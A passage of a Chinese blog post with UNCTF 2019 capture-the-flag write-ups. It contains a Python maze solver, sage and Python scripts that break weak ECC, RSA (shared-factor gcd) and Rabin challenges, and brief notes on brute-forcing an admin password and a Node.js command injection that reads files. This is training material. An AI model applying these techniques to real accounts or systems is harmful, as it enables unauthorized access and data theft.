class="number">1</span>]):</span><br><span class="line">            res += <span class="string">'4'</span></span><br><span class="line">        <span class="keyword">elif</span> (tmp[<span class="number">0</span>] &gt; sol[i][<span class="number">0</span>]) <span class="keyword">and</span> (tmp[<span class="number">1</span>] == sol[i][<span class="number">1</span>]):</span><br><span class="line">            res += <span class="string">'1'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res += <span class="string">'2'</span></span><br><span class="line">        tmp = sol[i]</span><br><span class="line">    fix(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用来判断坐标是否合法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_valid</span><span class="params">(mg, x, y)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> x &gt;= <span class="number">0</span> <span class="keyword">and</span> x &lt; len(mg) <span class="keyword">and</span> y &gt;= <span class="number">0</span> <span class="keyword">and</span> y &lt; len(mg[<span class="number">0</span>]) <span class="keyword">and</span> mg[x][y] == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 迷宫结果优化</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process</span><span class="params">(step)</span>:</span></span><br><span class="line">    <span class="comment"># 先识别哪些无路可走的点的下一个点</span></span><br><span class="line">    change_records = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(step) - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> (abs(step[i][<span class="number">0</span>] - step[i + <span class="number">1</span>][<span class="number">0</span>]) == <span class="number">0</span> <span class="keyword">and</span> abs(step[i][<span class="number">1</span>] - step[i + <span class="number">1</span>][<span class="number">1</span>]) == <span class="number">1</span>) <span class="keyword">or</span> \</span><br><span class="line">                (abs(step[i][<span class="number">0</span>] - step[i + <span class="number">1</span>][<span class="number">0</span>]) == <span class="number">1</span> <span class="keyword">and</span> abs(step[i][<span class="number">1</span>] - step[i + <span class="number">1</span>][<span class="number">1</span>]) == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            change_records.append(i + <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># print(change_records)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 然后根据这些点识别出这个点的最远回退点</span></span><br><span class="line">    clip_nums = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> change_records:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i):</span><br><span class="line">            <span class="keyword">if</span> (abs(step[j][<span class="number">0</span>] - step[i][<span class="number">0</span>]) == <span class="number">0</span> <span class="keyword">and</span> abs(step[j][<span class="number">1</span>] - step[i][<span class="number">1</span>]) == <span class="number">1</span>) <span class="keyword">or</span> \</span><br><span class="line">                    (abs(step[j][<span class="number">0</span>] - step[i][<span class="number">0</span>]) == <span class="number">1</span> <span class="keyword">and</span> abs(step[j][<span class="number">1</span>] - step[i][<span class="number">1</span>]) == <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        clip_nums.append((j, i))</span><br><span class="line">    <span class="comment"># print(clip_nums)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 注意回退点之间的包含关系, 逆序处理, 是为了规避顺序对列表进行处理后下标偏移的问题</span></span><br><span class="line">    record = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> clip_nums[::<span class="number">-1</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (i[<span class="number">0</span>] <span class="keyword">in</span> record <span class="keyword">or</span> i[<span class="number">1</span>] <span class="keyword">in</span> record):</span><br><span class="line">            step = step[:i[<span class="number">0</span>] + <span class="number">1</span>] + step[i[<span class="number">1</span>]:]</span><br><span class="line">        record += list(range(i[<span class="number">0</span>], i[<span class="number">1</span>]))</span><br><span class="line">    <span class="comment"># print(step)</span></span><br><span class="line">    translate(step)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">step = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">final</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"Walk success!"</span>)</span><br><span class="line">    files = os.listdir(<span class="string">'.'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> files:</span><br><span class="line">        portion = os.path.splitext(filename)</span><br><span class="line">        <span class="keyword">if</span> portion[<span class="number">1</span>] == <span class="string">'.zip'</span>:</span><br><span class="line">            os.remove(filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> files:</span><br><span class="line">        portion = os.path.splitext(filename)</span><br><span class="line">        <span class="keyword">if</span> portion[<span class="number">1</span>] == <span class="string">'.jpg'</span>:</span><br><span class="line">            newname = portion[<span class="number">0</span>] + <span class="string">'.zip'</span></span><br><span class="line">            os.rename(filename, newname)</span><br><span class="line"></span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">walk</span><span class="params">(mg, x, y, ex, ey)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> step</span><br><span class="line">    <span class="keyword">if</span> x == ex <span class="keyword">and</span> y == ey:</span><br><span class="line">        step.append((x, y))</span><br><span class="line">        process(step)</span><br><span class="line">        <span class="comment"># sys.exit()</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> check_valid(mg, x, y):</span><br><span class="line">        step.append((x, y))</span><br><span class="line">        mg[x][y] = <span class="number">2</span></span><br><span class="line">        walk(mg, x, y + <span class="number">1</span>, ex, ey)</span><br><span class="line">        walk(mg, x, y - <span class="number">1</span>, ex, ey)</span><br><span class="line">        walk(mg, x - <span class="number">1</span>, y, ex, ey)</span><br><span class="line">        walk(mg, x + <span class="number">1</span>, y, ex, ey)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_black</span><span class="params">(color)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> color[<span class="number">0</span>] &lt;= <span class="number">30</span> <span class="keyword">and</span> color[<span class="number">1</span>] &lt;= <span class="number">30</span> <span class="keyword">and</span> color[<span class="number">2</span>] &lt;= <span class="number">30</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_start</span><span class="params">(color, y, x)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">            <span class="keyword">if</span> (abs(color[y+i<span class="number">-3</span>][x+j<span class="number">-3</span>][<span class="number">0</span>] - <span class="number">198</span>) &lt;= <span class="number">30</span>) <span class="keyword">and</span> (abs(color[y+i<span class="number">-3</span>][x+j<span class="number">-3</span>][<span class="number">1</span>] - <span class="number">47</span>) &lt;= <span class="number">30</span>) <span class="keyword">and</span> (abs(color[y+i<span class="number">-3</span>][x+j<span class="number">-3</span>][<span class="number">2</span>] - <span class="number">36</span>) &lt;= <span class="number">30</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_end</span><span class="params">(color, y, x)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">            <span class="keyword">if</span> (abs(color[y+i<span class="number">-3</span>][x+j<span class="number">-3</span>][<span class="number">0</span>] - <span class="number">255</span>) &lt;= <span class="number">30</span>) <span class="keyword">and</span> (abs(color[y+i<span class="number">-3</span>][x+j<span class="number">-3</span>][<span class="number">1</span>] - <span class="number">212</span>) &lt;= <span class="number">30</span>) <span class="keyword">and</span> (abs(color[y+i<span class="number">-3</span>][x+j<span class="number">-3</span>][<span class="number">2</span>] - <span class="number">83</span>) &lt;= <span class="number">30</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_block</span><span class="params">(imgz, size)</span>:</span></span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>, size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> is_black(imgz[i][i]):</span><br><span class="line">            ans = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    l_block = size[<span class="number">0</span>] // ans</span><br><span class="line">    <span class="keyword">return</span> l_block</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_maze</span><span class="params">(imgs, size)</span>:</span></span><br><span class="line">    maze = []</span><br><span class="line">    print(size)</span><br><span class="line">    l_block = get_block(imgs, size)</span><br><span class="line">    measure = size[<span class="number">0</span>] // l_block</span><br><span class="line">    <span class="comment"># print(str(measure))</span></span><br><span class="line">    <span class="comment"># measure = eval(input('line'))</span></span><br><span class="line">    linx = (size[<span class="number">0</span>] // measure) * <span class="number">2</span></span><br><span class="line">    liny = (size[<span class="number">1</span>] // measure) * <span class="number">2</span></span><br><span class="line">    sy = <span class="number">0</span></span><br><span class="line">    sx = <span class="number">0</span></span><br><span class="line">    ey = <span class="number">0</span></span><br><span class="line">    ex = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> idy <span class="keyword">in</span> range(liny):</span><br><span class="line">        line = []</span><br><span class="line">        y = int(idy * (measure / <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> range(linx):</span><br><span class="line">            x = int(idx * (measure / <span class="number">2</span>))</span><br><span class="line">            <span class="keyword">if</span> is_black(imgs[y][x]):</span><br><span class="line">                line.append(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> is_start(imgs, y, x):</span><br><span class="line">                sy = idy</span><br><span class="line">                sx = idx</span><br><span class="line">            <span class="keyword">if</span> is_end(imgs, y, x):</span><br><span class="line">                ey = idy</span><br><span class="line">                ex = idx</span><br><span class="line">                <span class="keyword">if</span> idy % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    ey -=<span class="number">1</span></span><br><span class="line">        maze.append(line)</span><br><span class="line">    print(str(sy) + <span class="string">' '</span> + str(sx) + <span class="string">' '</span> + str(ey) + <span class="string">' '</span> + str(ex))</span><br><span class="line">    <span class="comment"># print(maze)</span></span><br><span class="line">    walk(maze, sy, sx, ey, ex)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    r_img = Image.open(<span class="string">'flag.jpg'</span>)</span><br><span class="line">    img = np.array(r_img.convert(<span class="string">'RGBA'</span>))</span><br><span class="line">    to_maze(img, (len(img[<span class="number">0</span>]), len(img)))</span><br><span class="line">    r_img.close()</span><br></pre></td></tr></table></figure>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="ECC和AES基础"><a href="#ECC和AES基础" class="headerlink" title="ECC和AES基础"></a>ECC和AES基础</h2><p>首先通过解ECC得到AES的密钥。</p>
<p>通过爆破得到ECC的私钥，然后解密得到AES的密钥。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># filename: solver.sage</span></span><br><span class="line"></span><br><span class="line">M = <span class="number">15424654</span></span><br><span class="line"></span><br><span class="line">E=EllipticCurve(GF(<span class="number">15424654874903</span>),[<span class="number">16546484</span>,<span class="number">4548674875</span>])</span><br><span class="line"></span><br><span class="line">G=E(<span class="number">6478678675</span>, <span class="number">5636379357093</span>)</span><br><span class="line">K=E(<span class="number">2854873820564</span>,<span class="number">9226233541419</span>)</span><br><span class="line"></span><br><span class="line">X = G</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, M):</span><br><span class="line">    <span class="keyword">if</span> X == K:</span><br><span class="line">        secret = i</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] secret:"</span>, i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        X = X + G</span><br><span class="line">        <span class="keyword">print</span> i</span><br><span class="line"></span><br><span class="line"><span class="comment">#secret  = 2019813</span></span><br><span class="line"></span><br><span class="line">c2=E(<span class="number">6860981508506</span>,<span class="number">1381088636252</span>)</span><br><span class="line">c1=E(<span class="number">1935961385155</span>,<span class="number">8353060610242</span>)</span><br><span class="line"><span class="comment">#题目的给的c1、c2要交换。。。</span></span><br><span class="line">m = c2 - (c1 * secret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'aes_key:'</span>+str(m[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#aes_key = 1026</span></span><br></pre></td></tr></table></figure>
<p>然后将结果带到AES解密脚本中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">phi = <span class="string">'/cM8Nx+iAidmt6RiqX8Vww=='</span></span><br><span class="line">key = bytes(<span class="string">'1026'</span>.ljust(<span class="number">16</span>, <span class="string">' '</span>))</span><br><span class="line"></span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">cip = base64.b64decode(phi)</span><br><span class="line">pla = aes.decrypt(cip)</span><br><span class="line"><span class="keyword">print</span> pla</span><br></pre></td></tr></table></figure>
<p>然后按照提示上的POST到指定网站，得到回复，提交即可。</p>
<h2 id="不仅仅是RSA"><a href="#不仅仅是RSA" class="headerlink" title="不仅仅是RSA"></a>不仅仅是RSA</h2><p>也是魔鬼吧，两分钟的摩斯电码。。。</p>
<p>然后通过openssl得到n和e，再就是通过最大公因数计算得到q，然后就计算得到p。这样就能解出来了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">4314251881242803343641258350847424240197348270934376293792054938860756265727535163218661012756264314717591117355736219880127534927494986120542485721347351</span></span><br><span class="line">c2 = <span class="number">485162209351525800948941613977942416744737316759516157292410960531475083863663017229882430859161458909478412418639172249660818299099618143918080867132349</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n1 = <span class="number">0xC461B3ED566F2D68583019170BDD5263D113BAECE3DEE6631F08A166376AC41FF5D4E90B3330E0FC26993E3B353F38F9B6B880DFBC5807636497561B7611047B</span></span><br><span class="line">n2 = <span class="number">0xA36E3A2A83FE2C1E33F285A08C3ECD36E377F4D9FFE828E2426D3ECED0A7F947631E932AEC327555511AC6D71E72686C1CB7DBBF3859A4D9A3D344FBF12A9553</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">41221</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b)</span><br><span class="line"></span><br><span class="line">q = gcd(n1, n2)</span><br><span class="line"></span><br><span class="line">p1 = n1 // q</span><br><span class="line">p2 = n2 // q</span><br><span class="line"></span><br><span class="line">fai_1 = (p1 - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">fai_2 = (p2 - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d1 = gmpy2.invert(e, fai_1)</span><br><span class="line">d2 = gmpy2.invert(e, fai_2)</span><br><span class="line"></span><br><span class="line">m1 = pow(c1, d1, n1)</span><br><span class="line">m2 = pow(c2, d2, n2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> binascii.unhexlify(hex(m1)[<span class="number">2</span>:]) + binascii.unhexlify(hex(m2)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>
<h2 id="一句话加密"><a href="#一句话加密" class="headerlink" title="一句话加密"></a>一句话加密</h2><p>在给的图片最后有一个16进制数，通过分解的得到p和q</p>
<p><img src="https://i.loli.net/2020/01/17/ZV8YSEHaRUn6Kbh.png" alt="MISC_yjhjm.png" style="zoom:50%;"></p>
<p>发现这个跟之前一道题的p、q一样，在Veritas501的博客中找到了相关脚本，将c1、c2分别解一次就行。然后将两次的结果中的一半flag连起来。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n2s</span><span class="params">(num)</span>:</span></span><br><span class="line">	t = hex(num)[<span class="number">2</span>:]</span><br><span class="line">	<span class="keyword">if</span> len(t) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">return</span> (<span class="string">'0'</span>+t).decode(<span class="string">'hex'</span>)</span><br><span class="line">	<span class="keyword">return</span> t.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">62501276588435548378091741866858001847904773180843384150570636252430662080263</span></span><br><span class="line">c2 = <span class="number">72510845991687063707663748783701000040760576923237697638580153046559809128516</span></span><br><span class="line"></span><br><span class="line">c = c1</span><br><span class="line">p = <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q = <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">n = p*q</span><br><span class="line">r = pow(c,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">s = pow(c,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">a = gmpy2.invert(p,q)</span><br><span class="line">b = gmpy2.invert(q,p)</span><br><span class="line">x =(a*p*s+b*q*r)%n</span><br><span class="line">y =(a*p*s-b*q*r)%n</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> n2s(x%n)</span><br><span class="line"><span class="keyword">print</span> n2s((-x)%n)</span><br><span class="line"><span class="keyword">print</span> n2s(y%n)</span><br><span class="line"><span class="keyword">print</span> n2s((-y)%n)</span><br></pre></td></tr></table></figure>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="帮赵总征婚"><a href="#帮赵总征婚" class="headerlink" title="帮赵总征婚"></a>帮赵总征婚</h2><p>爆破真的快乐.jpg</p>
<p>尝试爆破admin的密码，使用bp爆破</p>
<p><img src="https://i.loli.net/2020/01/17/tjFhWdHULfr6peI.png" alt="web_bzzzh.png" style="zoom:50%;"></p>
<h2 id="简单的备忘录"><a href="#简单的备忘录" class="headerlink" title="简单的备忘录"></a>简单的备忘录</h2><p>在输入框随便输入几个字符，会有提示。。。就按着点。。。</p>
<p><img src="https://i.loli.net/2020/01/17/tksJmBLfDpXKU9F.png" alt="web_jddjsb1.png" style="zoom:50%;"></p>
<p>然后慢慢试，就在admin的content里有flag</p>
<p><img src="https://i.loli.net/2020/01/17/gMwKUpJCSx6nqPj.png" alt="web_jddjsb.png" style="zoom:50%;"></p>
<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>是一个nodejs命令注入，可以通过fs模块读取文件。</p>
<p><img src="https://i.loli.net/2020/01/17/5idCDqYso7AZHBx.png" alt="web_checkin1.png" style="zoom:50%;"></p>
<p><img src="https://i.loli.net/2020/01/17/WehraBSiQn8FlCX.png" alt="web_checkin.png" style="zoom:50%;"></p>

      
    </div>

    

    
    
    

    

    
      
    
    

    
      <div>
        




  



<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>Critizero</li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    
    <a href="https://critizero.github.io/2019/10/28/Writeup_unctf_2019/" title="UNCTF2019 Writeup">https://critizero.github.io/2019/10/28/Writeup_unctf_2019/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
</ul>

      </div>
    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/10/02/repetition_shuzijingjiyunanquan/" rel="next" title="数字经济云安全pwn题复现">
                <i class="fa fa-chevron-left"></i> 数字经济云安全pwn题复现
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  
    <div class="comments" id="comments">
    </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Critizero">
            
              <p class="site-author-name" itemprop="name">Critizero</p>
              <div class="site-description motion-element" itemprop="description">当三日不见，刮目相看</div>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">20</span>
                    <span class="site-state-item-name">日志</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  
                    
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">3</span>
                    <span class="site-state-item-name">分类</span>
                  
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">7</span>
                    <span class="site-state-item-name">标签</span>
                  
                </div>
              
            </nav>
          

          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://github.com/critizero" title="GitHub &rarr; https://github.com/critizero" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="mailto:checcccc@163.com" title="E-Mail &rarr; mailto:checcccc@163.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                </span>
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://twitter.com/Critizero" title="Twitter &rarr; https://twitter.com/Critizero" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                </span>
              
            </div>
          

          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Dalao~
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.codgician.pw/" title="https://blog.codgician.pw/" rel="noopener" target="_blank">codgician</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.fandazh.cn" title="http://www.fandazh.cn" rel="noopener" target="_blank">fanda</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://passingfoam.com/" title="http://passingfoam.com/" rel="noopener" target="_blank">passingfoam</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://fiercec4t.top/" title="http://fiercec4t.top/" rel="noopener" target="_blank">fiercec4t</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://dldxz.cn" title="https://dldxz.cn" rel="noopener" target="_blank">dldxz</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://fzwjscj.xyz/" title="http://fzwjscj.xyz/" rel="noopener" target="_blank">FzWjScJ</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://jayxv.github.io/" title="https://jayxv.github.io/" rel="noopener" target="_blank">V</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          
          

        </div>
      </div>

      
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#REVERSE"><span class="nav-number">1.</span> <span class="nav-text">REVERSE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#unctf-babyre2"><span class="nav-number">1.1.</span> <span class="nav-text">unctf_babyre2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#奇怪的数组"><span class="nav-number">1.2.</span> <span class="nav-text">奇怪的数组</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyvm"><span class="nav-number">1.3.</span> <span class="nav-text">easyvm</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unctf-easy-Maze"><span class="nav-number">1.4.</span> <span class="nav-text">unctf_easy_Maze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Easy-Android"><span class="nav-number">1.5.</span> <span class="nav-text">Easy_Android</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#666"><span class="nav-number">1.6.</span> <span class="nav-text">666</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BabyXor"><span class="nav-number">1.7.</span> <span class="nav-text">BabyXor</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" 